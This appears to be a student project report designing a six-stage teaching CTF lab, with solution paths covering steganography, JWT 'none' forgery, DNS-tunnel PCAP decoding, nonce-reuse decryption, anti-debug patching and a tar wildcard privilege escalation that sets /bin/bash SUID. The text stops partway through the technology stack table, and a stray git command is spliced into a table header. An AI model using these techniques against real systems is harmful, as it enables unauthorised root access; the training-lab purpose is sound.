# CTF PLAY BOX IMPLEMENTATION — PROJECT INITIATION REPORT
## Module: Penetration Testing & Vulnerability Assessment
### Academic Year: 2026/2027 | Coursework: Individual / Group Project Initiation (Stage 1)

---

| Metric / Field | Detail |
| :--- | :--- |
| **Assignmengit commit -m "first commit"t Title** | CTF Play Box Implementation — Project Initiation |
| **Target Platform / Box Name** | **Project AegisBreach: Operation Midnight Raven** |
| **Learning Outcomes Covered** | **LO1**: Apply information gathering techniques in the penetration testing process<br>**LO2**: Evaluate the necessary penetration testing tools and techniques in a given scenario<br>**LO3**: Develop exploitation code to facilitate penetration testing |
| **Mode of Submission** | Electronic Submission of Report & Design Architecture |
| **Maximum Marks** | 100 Marks (10% Contribution to Final Module Grade) |
| **Submission Deadline** | 25/09/2026 |
| **Platform Target** | Dockerized Lightweight CTFd Platform & Isolated Multi-Tier Vulnerable Host Stack |

---

## Table of Contents
1. [Executive Summary](#1-executive-summary)
2. [Project Objectives & Learning Outcomes Mapping](#2-project-objectives--learning-outcomes-mapping)
3. [CTF Concept, Theme & Scenario Overview](#3-ctf-concept-theme--scenario-overview)
4. [Cybersecurity Domain Selection & Justification](#4-cybersecurity-domain-selection--justification)
5. [Basic Information of the Proposed CTF Platform](#5-basic-information-of-the-proposed-ctf-platform)
6. [Challenge & Stage Specifications (Stages 1 to 6)](#6-challenge--stage-specifications)
   - [Stage 1: Ghost in the Feed (OSINT & Steganography)](#stage-1-ghost-in-the-feed-stg-01-recon)
   - [Stage 2: Broken Gatekeeper (Web Security & Broken Access Control)](#stage-2-broken-gatekeeper-stg-02-web)
   - [Stage 3: Silent Beacon (Network Analysis & C2 Packet Forensics)](#stage-3-silent-beacon-stg-03-net)
   - [Stage 4: Vault of Echoes (Applied Cryptography & Nonce Reuse)](#stage-4-vault-of-echoes-stg-04-crypto)
   - [Stage 5: Dissecting the Implant (Reverse Engineering & Binary Analysis)](#stage-5-dissecting-the-implant-stg-05-rev)
   - [Stage 6: The Core Bastion (Linux Security & Privilege Escalation)](#stage-6-the-core-bastion-stg-06-privesc)
7. [Platform & Box Architecture Design](#7-platform--box-architecture-design)
8. [Proposed Technology Stack & Resource Requirements](#8-proposed-technology-stack--resource-requirements)
9. [Deployment, Isolation & Security Controls Plan](#9-deployment-isolation--security-controls-plan)
10. [Testing, Verification & Recovery Strategy](#10-testing-verification--recovery-strategy)
11. [Four-Member Individual Contribution Matrix](#11-four-member-individual-contribution-matrix)
12. [Risks, Dependencies & Limitations](#12-risks-dependencies--limitations)
13. [Conclusion & Next Implementation Milestones](#13-conclusion--next-implementation-milestones)
14. [References](#14-references)
15. [Appendices: Generative AI Prompt Log](#15-appendices-generative-ai-prompt-log)

---

## 1. Executive Summary

In contemporary cybersecurity pedagogy, hands-on experiential learning through Capture The Flag (CTF) challenges provides an invaluable bridge between theoretical vulnerability models and real-world penetration testing methodology. This report presents the formal **Project Initiation and Design Specification** for **Project AegisBreach: Operation Midnight Raven**, a modular, multi-domain, progressive CTF Play Box environment.

Designed around a simulated Advanced Persistent Threat (APT) intrusion into an enterprise fintech cloud infrastructure ("Apex Digital Financials"), the proposed CTF incorporates **six progressively difficult stages** spanning **five distinct cybersecurity domains**: OSINT/Steganography, Web Application Security, Network Forensics, Applied Cryptography, Reverse Engineering, and Linux Privilege Escalation. 

The design addresses real-world penetration testing learning outcomes (LO1, LO2, LO3), providing measurable progression from reconnaissance to custom exploitation script development. To ensure isolation, rapid reproducibility, and non-interference with host environments, the system utilizes a **Docker containerized multi-network architecture** managed through an orchestrated **CTFd scoring engine** with automated health checks, state-reset mechanisms, and isolated internal bridges. This document details the architectural blueprints, stage logic, solution pathways, hint penalty models, risk assessments, and a balanced four-member team distribution plan to govern subsequent implementation phases.

---

## 2. Project Objectives & Learning Outcomes Mapping

The overarching objective of the AegisBreach Play Box is to provide participants with an immersive, guided, yet technically demanding simulation of an enterprise security compromise. The design systematically aligns each challenge stage to the academic module learning outcomes:

| Stage ID & Title | Domain | Difficulty | Target Learning Outcome (LO) | Real-World Competency Assessed |
| :--- | :--- | :--- | :--- | :--- |
| **STG-01-RECON**<br>Ghost in the Feed | OSINT / Stego | Easy | **LO1**: Information Gathering | Public footprinting, social media metadata harvesting, least-significant-bit (LSB) image payload extraction. |
| **STG-02-WEB**<br>Broken Gatekeeper | Web Security | Easy | **LO1 & LO2**: Info Gathering & Tool Evaluation | Web directory fuzzing (Gobuster), HTTP request tampering, JWT algorithm confusion (`none` algorithm / weak secret), and IDOR log extraction. |
| **STG-03-NET**<br>Silent Beacon | Networking / PCAP | Moderate | **LO2**: Penetration Testing Tool Evaluation | Packet inspection (Wireshark/tshark), DNS exfiltration parsing, C2 beacon timing analysis, and base64 payload reconstruction. |
| **STG-04-CRYPTO**<br>Vault of Echoes | Cryptography | Moderate | **LO2 & LO3**: Tool Evaluation & Exploit Scripting | Cryptanalysis of AES-CTR nonce reuse (Two-Time Pad attack), developing automated Python deciphering scripts to recover encrypted credentials. |
| **STG-05-REV**<br>Dissecting the Implant | Reverse Eng. | Moderate–Hard | **LO2 & LO3**: Reverse Engineering & Exploit Code | Static disassembly with Ghidra/GDB, anti-debugging bypass, string de-obfuscation, and payload reconstruction to trigger an internal port-knocking sequence. |
| **STG-06-PRIVESC**<br>The Core Bastion | Linux Security | Hard | **LO2 & LO3**: Privilege Escalation & Exploit Dev | Post-exploitation local enumeration (LinPEAS), abusing misconfigured sudo permissions (wildcard injection / GTFOBins) and crafting a local C/Bash privilege escalation exploit. |

---

## 3. CTF Concept, Theme & Scenario Overview

### 3.1 Narrative Storyline: Operation Midnight Raven
*Apex Digital Financials*, a Tier-2 payment processing and digital banking service provider, suffered an undetected security incident. Threat telemetry indicates that a state-sponsored adversary, codenamed **"Midnight Raven"**, breached external perimeters, established redundant covert command-and-control (C2) channels, extracted proprietary transactional algorithms, and planted an obfuscated rootkit within the core banking database bastion.

Participants assume the role of **Senior Incident Response and Offensive Red Team Consultants** hired by the National Financial Cyber Emergency Response Team (CERT). Rather than solving isolated, disjointed puzzles, participants unravel an ongoing attack chain:
1. **The Breach Inception**: The attacker left clues in open-source developer channels and social media assets.
2. **Perimeter Breach**: Attacker exploited an insecure administrative web portal API.
3. **Data Infiltration & C2**: Internal workstations established covert DNS beacons to exfiltrate database schemas.
4. **Encrypted Stash**: A collected configuration package was locked with a custom cryptographic routine.
5. **Malware Deconstruction**: A compiled ELF backdoor implant deployed on the staging server must be reverse-engineered to identify the attacker's secondary credentials and command protocols.
6. **Domain Bastion Takeover**: Armed with the recovered credentials, participants access the internal Linux bastion host, discover system misconfigurations, and exploit them to gain root-level control, recovering the final evidence flag (`root.txt`).

---

## 4. Cybersecurity Domain Selection & Justification

The assignment requires a minimum of 6 stages covering at least 4 different cybersecurity domains. The AegisBreach platform encompasses **5 core domains**:

```
+-----------------------------------------------------------------------------------+
|                        AEGISBREACH DOMAIN COVERAGE MATRIX                         |
+------------------------------------+----------------------------------------------+
| 1. OSINT & Steganography           | Threat actor footprinting & metadata parsing |
| 2. Web Security                    | API vulnerabilities, JWT tampering & IDOR    |
| 3. Network & Packet Forensics      | Covert C2 DNS tunneling & pcap extraction    |
| 4. Applied Cryptography            | Stream cipher misuse & exploit scripting     |
| 5. Reverse Engineering & Binary    | Linux ELF disassembly & anti-analysis bypass |
| 6. Linux System Security / PrivEsc | Sudo wildcard hijacking & root escalation    |
+------------------------------------+----------------------------------------------+
```

### Justification of Domains
1. **OSINT & Steganography (Reconnaissance)**: Essential for modern penetration testers. Real-world adversaries rarely attack blind; they leverage employee leakage, public repositories, and hidden steganographic channels for covert transmission.
2. **Web Technologies / Web Security**: Web applications represent over 70% of external corporate attack surfaces. Assessing modern API authentication (JWT) and access control flaws mirrors current OWASP Top 10 vulnerabilities (A01: Broken Access Control).
3. **Network & Packet Forensics**: Penetration testers and incident responders must understand how their tools interact with network protocols and how covert exfiltration channels (such as DNS tunneling) appear on the wire.
4. **Applied Cryptography**: Cryptography is frequently implemented improperly in custom software. Teaching students to write practical Python decryption scripts against flawed cipher implementations aligns directly with LO3.
5. **Reverse Engineering & Linux Privilege Escalation**: Completing the attack chain requires students to transition from external footholds to internal binary analysis and root-level privilege escalation, developing deep operating system proficiency.

---

## 5. Basic Information of the Proposed CTF Platform

| Required Specification Field | Platform Implementation Detail |
| :--- | :--- |
| **CTF / Box Name** | **Project AegisBreach: Operation Midnight Raven** |
| **Theme / Scenario** | Enterprise Cloud Fintech Compromise & Threat Actor Incident Response |
| **Target Audience** | Undergraduate Cybersecurity / Computer Science students, junior penetration testers, and security enthusiasts with basic Linux and networking knowledge. |
| **Learning Outcomes** | Practical mastery of LO1 (Information Gathering), LO2 (Tool Evaluation), and LO3 (Exploit Development). |
| **Total Challenge Count** | **6 Stages** (Modular design supports expansion to 8+ in Phase 2). |
| **Challenge Domains** | OSINT/Steganography, Web Application Security, Network Packet Analysis, Applied Cryptography, Reverse Engineering, Linux Privilege Escalation. |
| **Difficulty Model** | Progressive Tier: Easy (Stages 1–2) $\rightarrow$ Moderate (Stages 3–4) $\rightarrow$ Moderate–Hard (Stage 5) $\rightarrow$ Hard (Stage 6). |
| **Flag Format** | Standardized SHA-256 derived leet format: `AegisBreach{<descriptive_key_phrase_here>}` (e.g., `AegisBreach{jwt_s3cr3t_n0n3_4lg0_byp4ss}`). |
| **Platform Type** | Container-based web challenge dashboard (CTFd engine) combined with isolated backend target services. |
| **Operating Environment** | Host OS: Ubuntu Server 24.04 LTS (x86_64). Challenge Containers: Alpine Linux 3.19 and Debian 12 Bookworm slim images. |
| **Deployment Method** | Fully automated **Docker Compose** multi-container deployment, deployable on a single dedicated virtual machine, local workstation, or cloud instance (AWS EC2 / DigitalOcean). |
| **Network Design** | Dual segmented Docker bridge networks: `dmz_net` (publicly accessible web services) and `internal_bastion_net` (strictly isolated, accessible only via proxy/pivoting). |
| **Security Controls** | Non-root container privileges where applicable, read-only root filesystems on web tiers, ephemeral volume mounts, container memory/CPU cgroups limits, iptables isolation rules, and automated container reset cron jobs. |
| **Tools & Technologies** | Docker, Docker Compose, CTFd, Nginx (Reverse Proxy), Python 3.12, Flask, MySQL, SQLite, Ghidra, GDB, Wireshark, Burp Suite, John the Ripper. |
| **Estimated Resources** | **CPU**: 4 vCPUs minimum (8 vCPUs recommended for concurrent teams)<br>**RAM**: 8 GB RAM minimum (16 GB recommended)<br>**Storage**: 30 GB SSD storage<br>**Bandwidth**: 100 Mbps virtual switch |

---

## 6. Challenge & Stage Specifications

```
+--------------------------------------------------------------------------------------------------+
|                                  AEGISBREACH CHALLENGE PROGRESSION                               |
+-------------------+----------------------+-------------------+-------------------+---------------+
| Stage 1 (Easy)    | Stage 2 (Easy)       | Stage 3 (Mod)     | Stage 4 (Mod)     | Stg 5 (M-H)   |
| OSINT & Stego     | Web API & JWT        | DNS PCAP C2       | AES-CTR Crypto    | ELF Reverse   |
| "Ghost in Feed"   | "Broken Gatekeeper"  | "Silent Beacon"   | "Vault of Echoes" | "The Implant" |
+-------------------+----------------------+-------------------+-------------------+---------------+
                                                                                           |
                                                                                           v
                                                                                   +---------------+
                                                                                   | Stage 6 (Hard)|
                                                                                   | Linux PrivEsc |
                                                                                   | "Core Bastion"|
                                                                                   +---------------+
```

---

### Stage 1: Ghost in the Feed (`STG-01-RECON`)

* **Stage ID & Title**: `STG-01-RECON` — Ghost in the Feed
* **Domain**: OSINT / Digital Steganography
* **Difficulty**: Easy (Introductory reconnaissance & artifact recovery)
* **Scenario**: 
  Threat intelligence reports that a disgruntled senior sysadmin from Apex Financial posted an innocuous team photograph on a simulated developer repository and personal blog before disappearing. Intelligence analysts suspect the image contains covert steganographic instructions and initial credentials for the staging perimeter.
* **Learning Objective**: 
  LO1: Apply passive information gathering, open-source intelligence collection, and forensic image analysis to uncover hidden payloads.
* **Challenge Environment**: 
  Static downloadable asset hosted on the public CTFd attachments repository and linked via a simulated public GitHub/GitLab mock profile (`apex-fin-dev.internal`).
* **Player Task**: 
  Download the suspect JPEG image (`team_summit_2026.jpg`), inspect its EXIF metadata for reconnaissance clues, extract the hidden LSB (Least Significant Bit) payload using standard steganographic tools, and retrieve the initial access flag.
* **Flag Location / Logic**: 
  Embedded within the least significant bit plane of the image, encrypted with a password found within the EXIF `UserComment` metadata field (`Camera_ID: Apex_SecKey_9918`).
  *Flag*: `AegisBreach{0s1nt_st3g0_m3t4d4t4_unv31l3d}`
* **Required Tools**: 
  `exiftool`, `steghide`, `binwalk`, `strings`, `zsteg` (or CyberChef online).
* **Dependencies**: None (Initial Entry Stage).
* **Expected Solution Path**:
  1. Inspect the image with `exiftool team_summit_2026.jpg` $\rightarrow$ Notice unusual `XPComment` or `UserComment`: `StegPassphrase: Apex_SecKey_9918`.
  2. Run `steghide extract -sf team_summit_2026.jpg -p Apex_SecKey_9918`.
  3. Extract `perimeter_credentials.txt` containing the flag and a clue pointing to Stage 2's portal port.
* **Validation**: Flag submitted to the CTFd validation engine and matched with regex `^AegisBreach\{[a-zA-Z0-9_]+\}$`.
* **Hints & Penalty**:
  * *Hint 1 (Free)*: "Not everything in an image is visual. Check what metadata was retained during capture."
  * *Hint 2 (-5 pts)*: "Steghide requires a passphrase. Did the photographer leave a note in the EXIF tags?"
* **Reset / Recovery**: Static challenge asset; immutable file served from an S3 bucket or static Nginx container.

---

### Stage 2: Broken Gatekeeper (`STG-02-WEB`)

* **Stage ID & Title**: `STG-02-WEB` — Broken Gatekeeper
* **Domain**: Web Technologies / Web Security
* **Difficulty**: Easy to Moderate (Authentication bypass & broken object level authorization)
* **Scenario**: 
  Armed with the portal address recovered from Stage 1, the tester targets the Apex Financial Employee Internal Staging Portal (`http://staging.apex.internal:8080`). The portal requires JWT (JSON Web Token) authentication for employee access, but the staging environment contains an insecurely configured authentication middleware.
* **Learning Objective**: 
  LO1 & LO2: Analyze web traffic, evaluate interception proxies (Burp Suite), identify weak cryptographic token verification, and manipulate token structures.
* **Challenge Environment**: 
  A lightweight Python Flask web application backed by SQLite, running inside container `aegis-web-stage2` attached to `dmz_net`.
* **Player Task**: 
  Enumerate the API endpoints, register a basic guest account, inspect the received JWT, exploit an algorithm confusion vulnerability (modify `alg: "HS256"` to `alg: "none"` or sign with an exposed weak key `secret123`), elevate privileges to `role: "admin"`, and access the restricted audit endpoint (`/api/v1/audit/system-logs`) to uncover the incident logs and flag.
* **Flag Location / Logic**: 
  Returned in the JSON payload of `/api/v1/audit/system-logs` when a valid admin-authorized JWT is supplied in the `Authorization: Bearer <token>` header.
  *Flag*: `AegisBreach{jwt_s3cr3t_n0n3_4lg0_byp4ss}`
* **Required Tools**: 
  Burp Suite Community / OWASP ZAP, `curl`, browser developer tools, jwt.io / Python `pyjwt`.
* **Dependencies**: Completion of Stage 1 (discovers port 8080).
* **Expected Solution Path**:
  1. Navigate to the login page and register as a guest user (`user: pass`).
  2. Intercept the authenticated response and extract the JWT token from the `Set-Cookie` or JSON response.
  3. Decode the JWT header and payload: `{"alg":"HS256","typ":"JWT"}` and `{"user":"guest","role":"user"}`.
  4. Modify the role to `"role":"admin"`, strip the signature, and set `"alg":"none"` (or crack the weak secret `secret123` using `jwt-tool`).
  5. Send a `GET /api/v1/audit/system-logs` request with the forged token.
  6. The response outputs the server audit logs, the flag, and a download link to a network capture (`suspicious_traffic.pcapng`).
* **Validation**: CTFd backend database verification.
* **Hints & Penalty**:
  * *Hint 1 (-5 pts)*: "Look closely at the JWT header. Does the server enforce signature verification if the algorithm is altered?"
  * *Hint 2 (-10 pts)*: "Try using the infamous `none` algorithm exploit or test common dictionary keys with jwt_tool."
* **Reset / Recovery**: Ephemeral Docker container. Reset via docker health-check script or CTFd container reset button which restarts the Flask process without persisting modified state.

---

### Stage 3: Silent Beacon (`STG-03-NET`)

* **Stage ID & Title**: `STG-03-NET` — Silent Beacon
* **Domain**: Networking / Packet Forensics
* **Difficulty**: Moderate (C2 beaconing analysis & protocol parsing)
* **Scenario**: 
  The incident logs recovered from the web server revealed an anomalous internal host generating tens of thousands of DNS requests to an external non-authoritative domain (`*.ns1.shadow-c2.net`). The incident response team captured 15 minutes of network traffic in `suspicious_traffic.pcapng`.
* **Learning Objective**: 
  LO2: Evaluate network analysis utilities (Wireshark, tshark) to dissect protocol anomalies, detect covert exfiltration, and reconstruct fragmented data streams.
* **Challenge Environment**: 
  Forensic packet capture file (`suspicious_traffic.pcapng`) distributed to the user, with an optional live packet replay container simulating the C2 DNS listener.
* **Player Task**: 
  Analyze the `.pcapng` file, filter out background noise (HTTP/ARP/NTP), identify the base32/base64 encoded subdomains in the continuous DNS `A` record queries, extract and order the hexadecimal sequence numbers, decode the concatenated payload, and recover the exfiltrated configuration file.
* **Flag Location / Logic**: 
  Within the decoded data payload reconstructed from the DNS query sequence.
  *Flag*: `AegisBreach{dns_tunn3l_c2_tr4ff1c_d3c0d3d}`
* **Required Tools**: 
  Wireshark, `tshark`, Python (`scapy` or `dpkt`), CyberChef, `sed`/`awk`.
* **Dependencies**: Stage 2 (PCAP file obtained from Stage 2's audit logs).
* **Expected Solution Path**:
  1. Open `suspicious_traffic.pcapng` in Wireshark.
  2. Filter by `dns && dns.qry.name contains "shadow-c2.net"`.
  3. Observe query structures: `<hex_seq>.<base64_chunk>.ns1.shadow-c2.net`.
  4. Write a brief extraction script using `tshark`:
     ```bash
     tshark -r suspicious_traffic.pcapng -Y 'dns.qry.name contains "shadow-c2"' -T fields -e dns.qry.name | sort -u > raw_dns.txt
     ```
  5. Parse chunks, sort by the sequence identifier, strip domain suffixes, base64-decode the stream, and save the resulting file `exfiltrated_loot.enc`.
  6. The header of the file contains the flag and an encrypted binary payload needed for Stage 4.
* **Validation**: Static flag verification in CTFd.
* **Hints & Penalty**:
  * *Hint 1 (-5 pts)*: "Focus on DNS queries rather than HTTP traffic. Look for high query volumes to subdomains of a single anomalous domain."
  * *Hint 2 (-10 pts)*: "The subdomains contain encoded data chunks prefixed with sequence numbers to ensure ordered reconstruction."
* **Reset / Recovery**: Static downloadable forensic artifact; zero container runtime overhead.

---

### Stage 4: Vault of Echoes (`STG-04-CRYPTO`)

* **Stage ID & Title**: `STG-04-CRYPTO` — Vault of Echoes
* **Domain**: Applied Cryptography
* **Difficulty**: Moderate (Stream cipher key reuse / Two-Time Pad attack)
* **Scenario**: 
  The file `exfiltrated_loot.enc` recovered from the DNS stream is encrypted alongside an intercepted encrypted communications log `comms_channel.enc`. Threat intelligence discovers that the threat actor utilized an automated custom Python script running AES in CTR (Counter) mode or a stream XOR cipher. However, the developer made a catastrophic cryptographic error: **they reused the identical Key and Nonce/IV across both files**, and the plaintext of `comms_channel.enc` is known to be a standard automated daily server greeting message.
* **Learning Objective**: 
  LO2 & LO3: Evaluate cryptographic weaknesses in cipher implementations and develop custom Python exploitation/decryption code to execute a known-plaintext Two-Time Pad attack.
* **Challenge Environment**: 
  Standalone cryptographic problem with challenge files (`exfiltrated_loot.enc`, `comms_channel.enc`, `comms_template.txt`) and a live verification socket script on port 9004.
* **Player Task**: 
  Write a Python cryptanalysis script that takes the two ciphertexts ($C_1 = P_1 \oplus K$, $C_2 = P_2 \oplus K$), computes $C_1 \oplus C_2 = P_1 \oplus P_2$, and utilizes the known plaintext $P_1$ to solve for $P_2 = (C_1 \oplus C_2) \oplus P_1$. Recover the exfiltrated database configuration credentials and the stage flag.
* **Flag Location / Logic**: 
  Plaintext recovered from `exfiltrated_loot.enc`.
  *Flag*: `AegisBreach{n0nc3_r3us3_tw0_t1m3_p4d_c0ll4ps3}`
* **Required Tools**: 
  Python 3 (`cryptography`, `pwntools`), CyberChef, hex editor (`xxd`).
* **Dependencies**: Stage 3 exfiltration artifact.
* **Expected Solution Path**:
  1. Understand the mathematical vulnerability: When $C_1 = P_1 \oplus S$ and $C_2 = P_2 \oplus S$ (where $S$ is the keystream generated by AES-CTR with reused Nonce), then:
     $$C_1 \oplus C_2 = P_1 \oplus P_2 \implies P_2 = C_1 \oplus C_2 \oplus P_1$$
  2. Write a concise Python script:
     ```python
     with open("comms_channel.enc", "rb") as f1, open("exfiltrated_loot.enc", "rb") as f2:
         c1, c2 = f1.read(), f2.read()
     with open("comms_template.txt", "rb") as f3:
         p1 = f3.read()
     keystream = bytes([a ^ b for a, b in zip(c1, p1)])
     p2 = bytes([a ^ b for a, b in zip(c2, keystream)])
     print(p2.decode(errors="ignore"))
     ```
  3. The decoded output prints the configuration file containing internal SSH credentials for user `svc-deploy` and the flag.
* **Validation**: CTFd automated submission check.
* **Hints & Penalty**:
  * *Hint 1 (-5 pts)*: "AES-CTR acts as a stream cipher. What happens when the same keystream is XORed with two different plaintexts?"
  * *Hint 2 (-10 pts)*: "XOR has commutative and associative properties. $A \oplus B \oplus A = B$."
* **Reset / Recovery**: Pure mathematical cryptanalysis; no state corruption possible.

---

### Stage 5: Dissecting the Implant (`STG-05-REV`)

* **Stage ID & Title**: `STG-05-REV` — Dissecting the Implant
* **Domain**: Reverse Engineering & Binary Analysis
* **Difficulty**: Moderate–Hard (ELF binary deconstruction & anti-analysis bypass)
* **Scenario**: 
  Using the credentials recovered from Stage 4 (`svc-deploy:ApexDeploy2026!`), participants SSH into the staging sandbox (`172.20.0.15`). Inside the home directory, they discover a compiled 64-bit Linux ELF binary named `raven_implant`. This binary appears to be an active backdoor client that connects to an internal bastion server, but the destination IP and port are encrypted in the `.rodata` section, and the binary aborts execution if it detects a debugger (`ptrace`).
* **Learning Objective**: 
  LO2 & LO3: Apply disassemblers and debuggers (Ghidra, GDB), circumvent basic anti-debugging controls, analyze compiled assembly logic, and develop an exploit trigger.
* **Challenge Environment**: 
  Debian-based staging container (`aegis-staging-box`) equipped with basic binary analysis tools, running in `internal_bastion_net`.
* **Player Task**: 
  Analyze `raven_implant` using static or dynamic analysis. Identify and bypass the `ptrace(PTRACE_TRACEME)` anti-debugging check (either by patching the binary instruction with `NOP`s or using GDB catchpoint). Reverse the byte-rotation / XOR routine applied to the internal connection string to uncover the hidden port-knocking sequence and retrieve the flag.
* **Flag Location / Logic**: 
  Calculated in memory right before the network connect call, or reconstructed via static analysis of the deobfuscation function `deobfuscate_config()`.
  *Flag*: `AegisBreach{r3v_3lf_ptr4c3_byp4ss_m4st3r}`
* **Required Tools**: 
  Ghidra, GDB / GEF, `objdump`, `readelf`, `strace`, `ltrace`.
* **Dependencies**: Stage 4 credentials.
* **Expected Solution Path**:
  1. Inspect file: `file raven_implant` $\rightarrow$ `ELF 64-bit LSB executable, x86-64, dynamically linked`.
  2. Open in Ghidra or disassemble with `objdump -d raven_implant`.
  3. Locate `main()`: Observe call to `ptrace(0, 0, 1, 0)`. If return value is $< 0$, binary terminates with message `"Debugger detected! Exiting..."`.
  4. Patch the `JNZ` instruction to `JZ` or replace with `NOP`s (`0x9090`).
  5. Trace into `deobfuscate_config()`: A buffer of 32 bytes is XORed with `0x5A` and rotated right by 3 bits.
  6. Replicate the loop in Python or run GDB up to the breakpoint after `deobfuscate_config` to read the memory address:
     ```gdb
     (gdb) b *deobfuscate_config+78
     (gdb) run
     (gdb) x/s $rax
     ```
  7. The memory dump yields the internal bastion host IP, port knock sequence (`7777, 8888, 9999`), and the stage flag.
* **Validation**: CTFd flag verification.
* **Hints & Penalty**:
  * *Hint 1 (-10 pts)*: "The binary checks if it is being traced. Look into the Linux `ptrace` system call and how its return code is handled."
  * *Hint 2 (-15 pts)*: "You do not have to write a full decompiler. Place a GDB breakpoint immediately after the deobfuscation loop finishes and inspect memory registers."
* **Reset / Recovery**: Staging container mounts the original binary as read-only. A wrapper script regenerates clean binaries in `/tmp` if student accidentally corrupts permissions.

---

### Stage 6: The Core Bastion (`STG-06-PRIVESC`)

* **Stage ID & Title**: `STG-06-PRIVESC` — The Core Bastion
* **Domain**: Linux / System Security & Privilege Escalation
* **Difficulty**: Hard (Wildcard injection & automated privilege escalation)
* **Scenario**: 
  Executing the port-knocking sequence discovered in Stage 5 opens an SSH port on the internal database bastion host (`172.20.0.50`). Logging in with a low-privileged system user (`db-auditor`), the participant finds themselves in a restricted shell. To permanently eradicate the threat actor's persistent backdoor and capture the final flag (`/root/root.txt`), the participant must escalate privileges to `root`.
* **Learning Objective**: 
  LO2 & LO3: Evaluate Linux operating system security configurations, conduct automated privilege escalation audits, and develop a working local exploit utilizing wildcard expansion / GTFOBins.
* **Challenge Environment**: 
  Dedicated Alpine/Debian Linux container (`aegis-core-bastion`) hardened with restricted shell permissions, segregated on `internal_bastion_net`.
* **Player Task**: 
  1. Enumerate local system configuration and sudo permissions (`sudo -l`).
  2. Discover that `db-auditor` can run `/usr/bin/tar -czf /backup/db_*.tar.gz *` as `root` without password inside `/var/log/audit/`.
  3. Recognize the Unix **Wildcard Expansion Vulnerability** (Tar Arbitrary Command Execution via `--checkpoint` parameters).
  4. Create crafted filenames in `/var/log/audit/` that execute a reverse shell or SUID bash payload when the backup command is invoked.
  5. Spawn a root shell, navigate to `/root/`, and read `root.txt`.
* **Flag Location / Logic**: 
  Located in `/root/root.txt`, readable strictly by UID 0.
  *Flag*: `AegisBreach{w1ldc4rd_t4r_pr1v_3sc_c4pst0n3}`
* **Required Tools**: 
  SSH client, `linpeas.sh` or manual enumeration commands (`sudo -l`, `find / -perm -4000 2>/dev/null`), Bash scripting.
* **Dependencies**: Completion of Stage 5 (port-knocking sequence and bastion IP).
* **Expected Solution Path**:
  1. Execute port knock sequence from staging box:
     ```bash
     for port in 7777 8888 9999; do nc -z -w 1 172.20.0.50 $port; done
     ```
  2. Connect to Bastion via SSH: `ssh db-auditor@172.20.0.50`.
  3. Check sudo permissions:
     ```bash
     sudo -l
     # Output: (root) NOPASSWD: /usr/bin/tar -czf /backup/audit_backup.tar.gz *
     ```
  4. Exploit `tar` command-line parameter injection via Unix wildcard:
     ```bash
     cd /var/log/audit
     echo "chmod +s /bin/bash" > root_exploit.sh
     chmod +x root_exploit.sh
     touch -- "--checkpoint=1"
     touch -- "--checkpoint-action=exec=sh root_exploit.sh"
     sudo /usr/bin/tar -czf /backup/audit_backup.tar.gz *
     ```
  5. When `tar` expands `*`, it interprets `--checkpoint=1` and `--checkpoint-action=exec=sh root_exploit.sh` as command-line flags rather than file arguments.
  6. Tar executes `root_exploit.sh` with root permissions, making `/bin/bash` an SUID binary.
  7. Execute `/bin/bash -p` to obtain a root shell (`euid=0(root)`).
  8. Execute `cat /root/root.txt` to capture the final capstone flag.
* **Validation**: CTFd capstone validation and automated verification script.
* **Hints & Penalty**:
  * *Hint 1 (-10 pts)*: "Look at `sudo -l`. How does the Linux shell handle asterisks (`*`) in commands when files start with dashes (`--`)?"
  * *Hint 2 (-20 pts)*: "Check the GTFOBins documentation for `tar`. Search for checkpoint action command execution."
* **Reset / Recovery**: Automated Docker container reboot every 30 minutes, or an on-demand container restart script triggered via a lightweight web-hook (`/reset-stage6`).

---

## 7. Platform & Box Architecture Design

### 7.1 Architecture Overview
The AegisBreach platform is organized into three segregated zones:
1. **Management & Participant Tier**: The student/participant interacts over the external network with the **CTFd Scoring Platform** and the public staging web proxy.
2. **DMZ Network (`dmz_net`)**: Hosts publicly exposed challenge services (Stage 2 Web application and Stage 1 static distribution endpoints).
3. **Internal Bastion Network (`internal_bastion_net`)**: An isolated private Docker bridge without direct public internet routing. Hosts the staging jump host (Stage 5) and the core database bastion (Stage 6). Access is achievable strictly through credential pivoting and port knocking.

### 7.2 Architecture Diagram

```mermaid
flowchart TB
    subgraph ParticipantZone["Participant Environment"]
        User["Participant Workstation<br/>(Kali Linux / Parrot OS)"]
    end

    subgraph HostGateway["CTF Host Server (Docker Host - Ubuntu 24.04 LTS)"]
        NginxProxy["Nginx Reverse Proxy & SSL Gateway<br/>(Ports 80, 443, 8080)"]
        CTFd["CTFd Platform & Scoring Engine<br/>(Flag Validation & Hints)"]
        Redis["Redis Cache & Session Store"]
        MySQL["MySQL Database (CTFd State)"]
        
        CTFd --- Redis
        CTFd --- MySQL
        NginxProxy -->|HTTP 8000| CTFd
    end

    subgraph DMZ_Network["DMZ Bridge Network (172.19.0.0/24)"]
        Stage1Static["Stage 1: OSINT/Static Srv<br/>(team_summit_2026.jpg)"]
        Stage2Web["Stage 2: Flask Web Portal<br/>(JWT Insecure API - Port 8080)"]
        
        NginxProxy -->|Proxy 8080| Stage2Web
        NginxProxy -->|Static Assets| Stage1Static
    end

    subgraph Internal_Network["Internal Bastion Network (172.20.0.0/24) [No Direct WAN]"]
        Stage5Box["Stage 5: Staging Linux VM<br/>(IP: 172.20.0.15 - Port 2222)<br/>Ghidra/GDB / ELF Implant"]
        Stage6Core["Stage 6: Core Bastion Host<br/>(IP: 172.20.0.50)<br/>Port Knock Knock Daemon & Sudo Tar"]
        
        Stage2Web -.->|Discovers Pivoting Clue| Stage5Box
        Stage5Box ==>|Port Knock: 7777,8888,9999<br/>SSH Port 22| Stage6Core
    end

    User ==>|Web Browser / Burp (CTFd & Web Portal)| NginxProxy
    User -->|SSH / Tools (via Staging Port Forward 2222)| Stage5Box
```

### 7.3 Communication Paths & Security Boundaries
* **Path 1: Public Web Access**: Participant connects to CTFd via Port 80/443 for challenge registration, scoreboard visualization, hint unlocking, and flag submission.
* **Path 2: DMZ Target Interaction**: Web-based challenges (Stage 2) are proxied through Nginx on port 8080.
* **Path 3: Staging Access**: Stage 5 SSH is exposed via Docker host port forward `2222 -> 172.20.0.15:22` utilizing credentials cracked in Stage 4.
* **Path 4: Internal Lateral Movement**: The Stage 6 container has **no published ports** to the host. Participants must execute network enumeration and port knocking directly from the Stage 5 staging container across `172.20.0.0/24`.

---

## 8. Proposed Technology Stack & Resource Requirements

### 8.1 Technology Stack

```
+-------------------------------------------------------------------------------------------------+
|                                    TECHNOLOGY STACK SUMMARY                                     |
+----------------------+-----------------------------+--------------------------------------------+
